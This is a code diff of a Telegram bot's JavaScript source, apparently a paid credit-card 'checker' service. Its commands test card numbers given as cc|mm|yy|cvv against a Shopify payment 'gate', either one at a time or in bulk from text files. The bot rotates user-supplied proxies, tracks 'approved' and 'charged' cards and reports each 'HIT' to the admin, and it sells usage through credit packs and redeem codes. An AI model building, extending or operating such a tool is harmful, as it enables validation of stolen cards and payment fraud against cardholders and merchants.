-              validAdded++;
-          }
-      }
-  }
-
-  await user.save();
-
-  let resTxt = `✅ <b>Added ${validAdded} live proxies!</b>\n`;
-  if (alreadyMax) resTxt += `\n⚠️ You reached the max limit of 10 proxies.\n`;
-  if (validAdded === 0 && !alreadyMax) resTxt = `❌ <b>No Working Proxies Found Or They Failed Test.</b>\nEnsure formats are correct.`;
-
-  bot.editMessageText(resTxt, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" });
+  await processSiteAdd(msg.chat.id, text);
 });
 
+// =================== /checksites ===================
+bot.onText(/^\/checksites/, async (msg) => {
+  if (msg.chat.id !== ADMIN_ID) return;
+  const cfg = await Config.findOne({ key: "main_config" });
+  const sites = (cfg && cfg.shopifySites) ? cfg.shopifySites : [];
+  if (sites.length === 0) return bot.sendMessage(msg.chat.id, "\u274C No sites added yet.");
+  const statusMsg = await bot.sendMessage(msg.chat.id,
+    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + sites.length + " sites...</b>",
+    { parse_mode: "HTML" });
+  const checks = await Promise.all(sites.map(s => checkSiteFast(s)));
+  let live = [], dead = [];
+  sites.forEach((s, i) => { if (checks[i]) live.push(s); else dead.push(s); });
+  let txt = "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>SITES STATUS</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Live (" + live.length + "):</b>\n";
+  live.forEach((s,i) => { txt += (i+1)+". <code>"+s+"</code>\n"; });
+  txt += "\n\u274C <b>Dead (" + dead.length + ")</b>";
+  if (dead.length > 0) dead.forEach((s,i) => { txt += "\n"+(i+1)+". <code>"+s+"</code>"; });
+  bot.editMessageText(txt, { chat_id: msg.chat.id, message_id: statusMsg.message_id, parse_mode: "HTML" });
+});
+
+// =================== /clearsites ===================
+bot.onText(/^\/clearsites/, async (msg) => {
+  if (msg.chat.id !== ADMIN_ID) return;
+  await Config.findOneAndUpdate({ key: "main_config" }, { shopifySites: [] }, { upsert: true });
+  bot.sendMessage(msg.chat.id, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> All sites cleared!", { parse_mode: "HTML" });
+});
+
+// =================== PROXY FUNCTIONS ===================
+function parseProxies(text) {
+  return text.split(/\n+/).map(s => s.trim()).filter(s => s.length > 5);
+}
+
+async function processProxyAdd(chatId, text) {
+  const candidates = parseProxies(text);
+  if (candidates.length === 0) return bot.sendMessage(chatId, "\u274C No proxies found.");
+  const isAdmin = chatId === ADMIN_ID;
+  // Check limit BEFORE testing
+  if (!isAdmin) {
+    const user = await User.findOne({ chatId });
+    const currentCount = (user && user.proxies) ? user.proxies.length : 0;
+    if (currentCount >= 20) {
+      return bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Maximum limit reached!</b>\nYou already have 20 proxies.\nUse /clearproxy to remove first.",
+        { parse_mode: "HTML" });
+    }
+  }
+  const statusMsg = await bot.sendMessage(chatId,
+    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Testing " + candidates.length + " proxies... (Ultra Fast)</b>",
+    { parse_mode: "HTML" });
+
+  // Format all proxies first
+  const formatted = candidates.map(r => formatProxyToUrl(r)).filter(f => f !== null);
+  // Test ALL in parallel — ULTRA FAST
+  const results = await testProxiesBatch(formatted, 15);
+
+  let liveProxies = formatted.filter((f, i) => results[i] !== false);
+  let added = 0, dead = candidates.length - formatted.length + formatted.filter((f,i) => !results[i]).length, duplicate = 0;
+
+  if (isAdmin) {
+    const cfg = await Config.findOne({ key: "main_config" });
+    const existing = (cfg && cfg.globalProxies) ? cfg.globalProxies : [];
+    const newProxies = [...existing];
+    liveProxies.forEach(p => {
+      if (existing.includes(p)) { duplicate++; }
+      else { newProxies.push(p); added++; }
+    });
+    await Config.findOneAndUpdate({ key: "main_config" }, { globalProxies: newProxies }, { upsert: true });
+    bot.editMessageText(
+      "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Proxies Updated!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Live Added: " + added + "\n\u274C Dead/Invalid: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDF10 Total Global: " + newProxies.length,
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
+    );
+  } else {
+    const user = await User.findOne({ chatId });
+    const existing = user.proxies || [];
+    liveProxies.forEach(p => {
+      if (user.proxies.length >= 20) return;
+      if (existing.includes(p)) { duplicate++; }
+      else { user.proxies.push(p); added++; }
+    });
+    await user.save();
+    bot.editMessageText(
+      "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Proxies Added!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Live Added: " + added + "\n\u274C Dead/Invalid: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDF10 Your Total: " + user.proxies.length + "/20",
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
+    );
+  }
+}
+
+// =================== /addproxy ===================
+bot.onText(/^\/addproxy(?:\s*(.*))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  await getUser(chatId, msg.from.first_name);
+  // Check limit first
+  if (chatId !== ADMIN_ID) {
+    const user = await User.findOne({ chatId });
+    if (user && user.proxies && user.proxies.length >= 20) {
+      return bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Maximum 20 proxies allowed!</b>\nUse /clearproxy first.",
+        { parse_mode: "HTML" });
+    }
+  }
+  let text = match[1] ? match[1].trim() : "";
+  if (msg.reply_to_message) {
+    if (msg.reply_to_message.text) text = msg.reply_to_message.text;
+    else if (msg.reply_to_message.document) {
+      try { const fl = await bot.getFileLink(msg.reply_to_message.document.file_id); text = (await axios.get(fl)).data; } catch(e) {}
+    }
+  }
+  if (!text.trim()) {
+    userStates[chatId] = "WAITING_ADDPROXY";
+    return bot.sendMessage(chatId,
+      "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send proxies (one per line) or .txt file:</b>\n\n<i>Formats supported:\nhost:port\nhost:port:user:pass\nuser:pass@host:port</i>",
+      { parse_mode: "HTML" });
+  }
+  await processProxyAdd(chatId, text);
+});
+
+// =================== /checkproxy ===================
+bot.onText(/^\/checkproxy/, async (msg) => {
+  const chatId = msg.chat.id;
+  let proxies = [];
+  if (chatId === ADMIN_ID) {
+    const cfg = await Config.findOne({ key: "main_config" });
+    proxies = (cfg && cfg.globalProxies) ? cfg.globalProxies : [];
+  } else {
+    const user = await getUser(chatId, msg.from.first_name);
+    proxies = user.proxies || [];
+  }
+  if (proxies.length === 0) return bot.sendMessage(chatId, "\u274C No proxies added yet. Use /addproxy");
+  const statusMsg = await bot.sendMessage(chatId,
+    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + proxies.length + " proxies... (Ultra Fast)</b>",
+    { parse_mode: "HTML" });
+  const results = await testProxiesBatch(proxies, 15);
+  let live = [], dead = [];
+  proxies.forEach((p, i) => { if (results[i]) live.push(p); else dead.push(p); });
+  let txt = "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>PROXY STATUS</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Live (" + live.length + "):</b>\n";
+  live.forEach((p,i) => {
+    let d=p; try{const pts=p.split("://");if(pts.length===2){const ah=pts[1].split("@");if(ah.length===2){const up=ah[0].split(":");d=pts[0]+"://"+up[0]+":***@"+ah[1];}}}catch(e){}
+    txt += (i+1)+". <code>"+d+"</code>\n";
+  });
+  txt += "\n\u274C <b>Dead (" + dead.length + ")</b>";
+  bot.editMessageText(txt, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" });
+});
+
+// =================== /clearproxy ===================
+bot.onText(/^\/clearproxy/, async (msg) => {
+  const chatId = msg.chat.id;
+  if (chatId === ADMIN_ID) {
+    await Config.findOneAndUpdate({ key: "main_config" }, { globalProxies: [] }, { upsert: true });
+    return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> All global proxies cleared!", { parse_mode: "HTML" });
+  }
+  const user = await getUser(chatId, msg.from.first_name);
+  user.proxies = []; await user.save();
+  bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> Your proxies cleared!", { parse_mode: "HTML" });
+});
+
+// =================== /myproxy ===================
 bot.onText(/^\/myproxy/, async (msg) => {
   const chatId = msg.chat.id;
-  let user = await getUser(chatId, msg.from.first_name);
-
-  if (!user.proxies || user.proxies.length === 0) {
-    return bot.sendMessage(chatId, "⚠️ You don't have any proxies set.\nUse <code>/proxy IP:PORT:USER:PASS</code> or reply to a list.", { parse_mode: "HTML" });
-  }
-
-  let pList = user.proxies.map((p, i) => {
-      // Mask password
-      let display = p;
-      try {
-          const parts = p.split("://");
-          if (parts.length === 2) {
-              const authHost = parts[1].split("@");
-              if (authHost.length === 2) {
-                  const userPass = authHost[0].split(":");
-                  display = `${parts[0]}://${userPass[0]}:******@${authHost[1]}`;
-              }
-          }
-      } catch (e) {}
-      return `${i + 1}. <code>${display}</code>`;
+  const user = await getUser(chatId, msg.from.first_name);
+  if (!user.proxies || user.proxies.length === 0) return bot.sendMessage(chatId, "\u26A0\uFE0F No proxies. Use /addproxy");
+  const pList = user.proxies.map((p,i) => {
+    let d=p; try{const pts=p.split("://");if(pts.length===2){const ah=pts[1].split("@");if(ah.length===2){const up=ah[0].split(":");d=pts[0]+"://"+up[0]+":***@"+ah[1];}}}catch(e){}
+    return (i+1)+". <code>"+d+"</code>";
   }).join("\n");
-
-  let msgTxt = `🛠 <b>𝐘𝐎𝐔𝐑 𝐏𝐑𝐎𝐗𝐈𝐄𝐒 [${user.proxies.length}/10]</b>\n━━━━━━━━━━━━━━━━━\n${pList}\n\n<i>Use /rproxy [count] to remove.</i>`;
-  bot.sendMessage(chatId, msgTxt, { parse_mode: "HTML" });
+  bot.sendMessage(chatId, "\uD83D\uDEE0 <b>YOUR PROXIES ["+user.proxies.length+"/20]</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+pList+"\n\n<i>/clearproxy to remove all</i>", { parse_mode: "HTML" });
 });
 
-bot.onText(/^\/rproxy(?:\s*(.*))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  let user = await getUser(chatId, msg.from.first_name);
-
-  if (!user.proxies || user.proxies.length === 0) {
-    return bot.sendMessage(chatId, "⚠️ You don't have any proxy set.", { parse_mode: "HTML" });
-  }
-  
-  let countInput = match[1] ? match[1].trim() : null;
-  let removed = 0;
-
-  if (countInput && !isNaN(countInput)) {
-      let numToRemove = parseInt(countInput);
-      let toRemove = Math.min(numToRemove, user.proxies.length);
-      user.proxies.splice(-toRemove, toRemove); // remove from end
-      removed = toRemove;
-  } else {
-      removed = user.proxies.length;
-      user.proxies = [];
-  }
-
-  await user.save();
-  bot.sendMessage(chatId, `✅ <b>Successfully removed ${removed} proxies.</b>`, { parse_mode: "HTML" });
+// =================== /changeshopifyapi ===================
+bot.onText(/^\/changeshopifyapi (.+)/, async (msg, match) => {
+  try {
+    if (msg.chat.id !== ADMIN_ID) return;
+    const fullUrl = match[1].trim();
+    let apiBase = "";
+    try {
+      const urlObj = new URL(fullUrl);
+      apiBase = urlObj.origin + urlObj.pathname;
+    } catch(e) {
+      const bm = fullUrl.match(/^(https?:\/\/[^?]+)/);
+      if (bm) apiBase = bm[1];
+    }
+    if (!apiBase) return bot.sendMessage(msg.chat.id, "\u274C Invalid URL.");
+    await Config.findOneAndUpdate({ key: "main_config" }, { shopifyApiBase: apiBase }, { upsert: true });
+    bot.sendMessage(msg.chat.id, "\u2705 <b>API Updated!</b>\n\uD83D\uDD17 <code>" + escapeHTML(apiBase) + "</code>", { parse_mode: "HTML" });
+  } catch(e) { bot.sendMessage(msg.chat.id, "\u274C Error: " + e.message); }
 });
 
-// --- SINGLE CHECK COMMAND ---
+// =================== /sh ===================
 bot.onText(/^\/sh(?: (.+))?/, async (msg, match) => {
   delete userStates[msg.chat.id];
   const chatId = msg.chat.id;
   const user = await getUser(chatId, msg.from.first_name);
-
-  if (user.isBanned)
-    return bot.sendMessage(
-      chatId,
-      `<tg-emoji emoji-id="5402104393396931859">⚠️</tg-emoji> You are blocked.`,
-      { parse_mode: "HTML" },
-    );
-
-  if (!match[1]) {
-    return bot.sendMessage(
-      chatId,
-      `⚠️ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂.\nFormat: <code>/sh cc|mm|yy|cvv</code>`,
-      { parse_mode: "HTML" },
-    );
-  }
-
-  if (!(await deductCredits(user, 1))) {
-    return bot.sendMessage(
-      chatId,
-      `💳 <b>Not enough credits!</b> Please buy or redeem credits.\nUse /redeem CODE`,
-      { parse_mode: "HTML" },
-    );
-  }
-
+  if (user.isBanned) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5402104393396931859\">\u26D4</tg-emoji> You are blocked.", { parse_mode: "HTML" });
+  if (!match || !match[1]) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5402104393396931859\">\u26A0\uFE0F</tg-emoji> Format: <code>/sh cc|mm|yy|cvv</code>", { parse_mode: "HTML" });
+  if (!(await deductCredits(user, 1))) return bot.sendMessage(chatId, "<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Not enough credits!</b>\nUse /redeem CODE", { parse_mode: "HTML" });
   const ccInput = match[1].trim();
-  const safeCC = escapeHTML(ccInput);
-
-  const processText =
-    `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐏 𝐑 𝐎 𝐂 𝐄 𝐒 𝐒 𝐈 𝐍 𝐆 . . .</b>\n` +
-    `━━━━━━━━━━━━━━━━━\n` +
-    `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> <b>𝐂𝐚𝐫𝐝:</b> <code>${safeCC}</code>\n` +
-    `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> <b>𝐆𝐚𝐭𝐞:</b> 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟎.𝟗𝟖$\n` +
-    `━━━━━━━━━━━━━━━━━\n` +
-    `<i>"𝘎𝘳𝘦𝘢𝘵 𝘵𝘩𝘪𝘯𝘨𝘴 𝘵𝘢𝘬𝘦 𝘵𝘪𝘮𝘦, 𝘭𝘦𝘨𝘦𝘯𝘥."</i>`;
-
-  let processingMsg = await bot.sendMessage(chatId, processText, {
-    parse_mode: "HTML",
-  });
-
-  const cardData = await processCard(ccInput, getRandomProxy(user.proxies));
-
-  if (cardData.isApproved) {
-    user.totalApproved += 1;
-  } else {
-    user.totalDeclined += 1;
-  }
+  const proxy = getRandomItem(user.proxies);
+  const pm = await bot.sendMessage(chatId,
+    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>PROCESSING...</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Card:</b> <code>"+escapeHTML(ccInput)+"</code>\n<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Gate:</b> Shopify 0.98$\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    { parse_mode: "HTML" });
+  const cardData = await processCard(ccInput, proxy);
+  if (cardData.category === "approved" || cardData.category === "charged") user.totalApproved++;
+  else user.totalDeclined++;
   await user.save();
-
-  const finalMessage = formatCardResult(
-    cardData,
-    msg.from.first_name,
-    msg.from.id,
-  );
-
-  await bot.editMessageText(finalMessage, {
-    chat_id: chatId,
-    message_id: processingMsg.message_id,
-    parse_mode: "HTML",
+  const fm = formatCardResult(cardData, msg.from.first_name, msg.from.id);
+  const keyboard = getResultKeyboard(cardData.category);
+  await bot.editMessageText(fm, {
+    chat_id: chatId, message_id: pm.message_id,
+    parse_mode: "HTML", disable_web_page_preview: true,
+    reply_markup: keyboard
   });
-
-  if (cardData.isApproved && chatId !== adminId) {
-    bot.sendMessage(
-      adminId,
-      `🟢 <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐇𝐢𝐭 𝐁𝐲 <a href="tg://user?id=${chatId}">${escapeHTML(msg.from.first_name)}</a></b>\n━━━━━━━━━\n${finalMessage}`,
-      { parse_mode: "HTML" },
-    );
+  if ((cardData.category === "approved" || cardData.category === "charged") && chatId !== ADMIN_ID) {
+    bot.sendMessage(ADMIN_ID,
+      "\uD83D\uDFE2 <b>HIT!</b> By: <a href=\"tg://user?id="+chatId+"\">"+escapeHTML(msg.from.first_name)+"</a>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+fm,
+      { parse_mode: "HTML", disable_web_page_preview: true });
   }
 });
 
-// --- MASS CHECK COMMAND VIA TEXT ---
+// =================== /shmt ===================
 bot.onText(/^\/shmt/, async (msg) => {
-  bot.sendMessage(
-    msg.chat.id,
-    `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> <b>𝐒𝐞𝐧𝐝 𝐦𝐞 𝐲𝐨𝐮𝐫 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.</b>\n(One CC per line please)`,
-    { parse_mode: "HTML" },
-  );
   userStates[msg.chat.id] = "WAITING_TXT";
+  bot.sendMessage(msg.chat.id,
+    "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send your .txt file.</b>\n<i>One CC per line</i>",
+    { parse_mode: "HTML" });
 });
 
-// --- CALLBACK QUERIES (MENUS) ---
-bot.on("callback_query", async (cb) => {
-  const chatId = cb.message.chat.id;
-  const msgId = cb.message.message_id;
-
-  try {
-    if (cb.data === "admin_user_menu") {
-      sendUserHome(cb.message);
-    } else if (cb.data === "gate_menu") {
-      bot.editMessageReplyMarkup(
-        {
-          inline_keyboard: [
-            [
-              {
-                text: " 𝐂𝐡𝐚𝐫𝐠𝐞𝐝",
-                callback_data: "charged_menu",
-                icon_custom_emoji_id: "6136316288005314906",
-                color: "primary",
-              },
-            ],
-          ],
-        },
-        { chat_id: chatId, message_id: msgId },
-      );
-    } else if (cb.data === "charged_menu") {
-      bot.editMessageReplyMarkup(
-        {
-          inline_keyboard: [
-            [
-              {
-                text: " 𝐒𝐡𝐨𝐩𝐢𝐟𝐲",
-                callback_data: "sh_info",
-                icon_custom_emoji_id: "6138961691506907344",
-                color: "primary",
-              },
-            ],
-          ],
-        },
-        { chat_id: chatId, message_id: msgId },
-      );
-    } else if (cb.data === "sh_info") {
-      const shInfoText =
-        `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> 𝐆𝐚𝐭𝐞 ➠ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟏$\n` +
-        `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 ➠ <code>/sh cc|mm|yy|cvv</code>\n` +
-        `<tg-emoji emoji-id="6255591515544882364">✔️</tg-emoji> 𝐇𝐞𝐚𝐥𝐭𝐡 ➠ 𝟏𝟎𝟎% 𝐀𝐜𝐭𝐢𝐯𝐞\n` +
-        `━━━━━━━━━━━━━━━━━\n` +
-        `<tg-emoji emoji-id="5212920133504212456">🔥</tg-emoji> 𝘗𝘰𝘸𝘦𝘳𝘦𝘥 𝘉𝘺 𝘚𝘱𝘢𝘥𝘦`;
-      bot.sendMessage(chatId, shInfoText, { parse_mode: "HTML" });
-    } else if (cb.data === "mass_menu") {
-      bot.editMessageReplyMarkup(
-        {
-          inline_keyboard: [
-            [
-              {
-                text: " .txt Fɪʟᴇ",
-                callback_data: "mass_txt",
-                icon_custom_emoji_id: "6138728977293907990",
-                color: "primary",
-              },
-            ],
-          ],
-        },
-        { chat_id: chatId, message_id: msgId },
-      );
-    } else if (cb.data === "mass_txt") {
-      userStates[chatId] = "WAITING_TXT";
-      bot.sendMessage(
-        chatId,
-        `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> <b>𝐒𝐞𝐧𝐝 𝐦𝐞 𝐲𝐨𝐮𝐫 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞.</b>\n(One CC per line please)`,
-        { parse_mode: "HTML" },
-      );
-    } else if (cb.data === "tools_menu") {
-      const toolsText =
-        `<tg-emoji emoji-id="5219827798125846744">👑</tg-emoji> <b>𝐒𝐏𝐀𝐃𝐄 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</b>\n` +
-        `━━━━━━━━━━━━━━━━━\n` +
-        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/sh</code> - 𝐅𝐨𝐫 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟏$\n` +
-        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/shmt</code> - 𝐅𝐨𝐫 𝐌𝐚𝐬𝐬 𝐓𝐱𝐭 𝐅𝐢𝐥𝐞\n` +
-        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/proxy</code> - 𝐒𝐞𝐭 𝐏𝐫𝐨𝐱𝐲 (IP:PORT:USER:PASS)\n` +
-        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/myproxy</code> - 𝐂𝐡𝐞𝐜𝐤 𝐏𝐫𝐨𝐱𝐲\n` +
-        `<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <code>/rproxy</code> - 𝐃𝐞𝐥𝐞𝐭𝐞 𝐏𝐫𝐨𝐱𝐲\n\n` +
-        `<i>Many More Comming Soon..In V2</i> <tg-emoji emoji-id="5212920133504212456">🔥</tg-emoji>`;
-      bot.sendMessage(chatId, toolsText, { parse_mode: "HTML" });
-    } else if (cb.data === "pricing_menu") {
-      const pricingText =
-        `<tg-emoji emoji-id="5215191209131123104">💎</tg-emoji> <b>𝐒𝐏𝐀𝐃𝐄 𝐂𝐇𝐊𝐑 𝐁𝐎𝐓 𝐏𝐑𝐈𝐂𝐈𝐍𝐆</b> <tg-emoji emoji-id="5215191209131123104">💎</tg-emoji>\n` +
-        `━━━━━━━━━━━━━━━━━\n\n` +
-        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟏,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭</b>  $𝟓 \n` +
-        `⏳ <b>𝟕 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
-        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟐,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭</b> $𝟖\n` +
-        `⏳ <b>𝟕 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
-        `<tg-emoji emoji-id="6253656229051109191">✔️</tg-emoji> <b>𝟏𝟎,𝟎𝟎𝟎 𝐂𝐫𝐞𝐝𝐢𝐭𝐬</b> $𝟏𝟓\n` +
-        `⏳ <b>𝟑𝟎 𝐃𝐚𝐲𝐬 𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲</b>\n\n` +
-        `━━━━━━━━━━━━━━━━━\n` +
-        `<i>Secure, Fast, and Reliable Checker.</i> <tg-emoji emoji-id="5215399540814781035">👑</tg-emoji>`;
-
-      bot.sendMessage(chatId, pricingText, {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: " 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐎𝐰𝐧𝐞𝐫 𝐓𝐨 𝐁𝐮𝐲",
-                url: "https://t.me/ZeroSpade",
-                color: "positive",
-              },
-            ],
-          ],
-        },
-      });
-    } else if (cb.data === "profile_menu") {
-      const user = await getUser(chatId, cb.from.first_name);
-      const total = user.totalApproved + user.totalDeclined;
-      const joinDateStr = new Date(user.joinDate).toLocaleDateString("en-GB", {
-        day: "2-digit",
-        month: "short",
-        year: "numeric",
-      });
-
-      let expiryStr = "No Expiry";
-      if (user.planExpiry) {
-        expiryStr = new Date(user.planExpiry).toLocaleDateString("en-GB", {
-          day: "2-digit",
-          month: "short",
-          year: "numeric",
-        });
-      }
-
-      const profileText =
-        `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> <b>𝐘𝐎𝐔𝐑 𝐒𝐏𝐀𝐃𝐄 𝐏𝐑𝐎𝐅𝐈𝐋𝐄</b>\n` +
-        `━━━━━━━━━━━━━━━━━\n` +
-        `<tg-emoji emoji-id="6255561528083221310">✉️</tg-emoji> <b>𝐁𝐨𝐭 𝐉𝐨𝐢𝐧𝐞𝐝 𝐎𝐧:</b> ${joinDateStr}\n` +
-        `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> ${total}\n` +
-        `━━━━━━━━━━━━\n` +
-        `<tg-emoji emoji-id="6138803821394009204">✨</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝:</b> ${user.totalApproved}\n` +
-        `<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝:</b> ${user.totalDeclined}\n` +
-        `━━━━━━━━━━━━\n` +
-        `<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐏𝐥𝐚𝐧:</b> ${escapeHTML(user.planName)}\n` +
-        `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲:</b> ${expiryStr}\n` +
-        `<tg-emoji emoji-id="5215191209131123104">💰</tg-emoji> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐋𝐞𝐟𝐭:</b> ${user.credits}\n` +
-        `━━━━━━━━━━━━━━━━━`;
-
-      bot.sendMessage(chatId, profileText, { parse_mode: "HTML" });
-    } else if (cb.data.startsWith("admin_")) {
-      if (chatId !== adminId) return;
-      handleAdminMenu(cb, chatId);
-    }
-  } catch (err) {
-    console.error(err);
-  }
-
-  bot.answerCallbackQuery(cb.id).catch(() => {});
-});
-
-// Admin Sub-menus logic
-async function handleAdminMenu(cb, chatId) {
-  if (cb.data === "admin_users_list") {
-    const users = await User.find({}, "firstName chatId credits planName");
-    const jsonList = JSON.stringify(users, null, 2);
-
-    if (jsonList.length < 4000) {
-      bot.sendMessage(
-        chatId,
-        "<b>Users JSON List:</b>\n<pre>" + escapeHTML(jsonList) + "</pre>",
-        { parse_mode: "HTML" },
-      );
-    } else {
-      const buffer = Buffer.from(jsonList, "utf-8");
-      bot.sendDocument(chatId, buffer, { filename: "users.json" });
-    }
-  } else if (cb.data === "admin_manage_users") {
-    userStates[chatId] = "WAITING_ADMIN_USERID";
-    bot.sendMessage(
-      chatId,
-      "Please enter the Target User's Chat ID to Manage:",
-    );
-  } else if (cb.data === "admin_broadcast") {
-    userStates[chatId] = "WAITING_BROADCAST";
-    bot.sendMessage(
-      chatId,
-      "Please send the message you want to broadcast to all users:",
-    );
-  } else if (cb.data === "admin_gen_redeem") {
-    const keysText = `Select a pack to generate Redeem Code for:`;
-    bot.sendMessage(chatId, keysText, {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "Trial 100 (1D)", callback_data: "admin_rd_trial" }],
-          [
-            { text: "1,000 Credits (7D)", callback_data: "admin_rd_1k" },
-            { text: "2,000 Credits (7D)", callback_data: "admin_rd_2k" },
-          ],
-          [{ text: "10,000 Credits (30D)", callback_data: "admin_rd_10k" }],
-        ],
-      },
-    });
-  } else if (cb.data.startsWith("admin_rd_")) {
-    let codeLabel = cb.data.replace("admin_rd_", "");
-    let randStr = Math.random().toString(36).substring(2, 7).toUpperCase();
-    let code = "",
-      creds = 0,
-      days = 0,
-      pName = "";
-
-    switch (codeLabel) {
-      case "trial":
-        code = `1D_${randStr}_SPADECHKR`;
-        creds = 100;
-        days = 1;
-        pName = "Trial";
-        break;
-      case "1k":
-        code = `7D_${randStr}_SPADECHKR`;
-        creds = 1000;
-        days = 7;
-        pName = "1k Premium";
-        break;
-      case "2k":
-        code = `7D_${randStr}_SPADECHKR`;
-        creds = 2000;
-        days = 7;
-        pName = "2k Premium";
-        break;
-      case "10k":
-        code = `30D_${randStr}_SPADECHKR`;
-        creds = 10000;
-        days = 30;
-        pName = "10k Elite";
-        break;
-    }
-
-    await Redeem.create({
-      code,
-      credits: creds,
-      daysValid: days,
-      planName: pName,
-    });
-    bot.sendMessage(
-      chatId,
-      `✅ <b>Redeem Code Created!</b>\n\n<code>${code}</code>\n\nPlan: ${pName} (${creds} C / ${days} D)`,
-      { parse_mode: "HTML" },
-    );
-  } else if (cb.data.startsWith("admin_mod_")) {
-    let parts = cb.data.split("_");
-    let action = parts[2];
-    let targetId = parts[3];
-    const user = await User.findOne({ chatId: targetId });
-    if (!user) return bot.sendMessage(chatId, "User not found.");
-
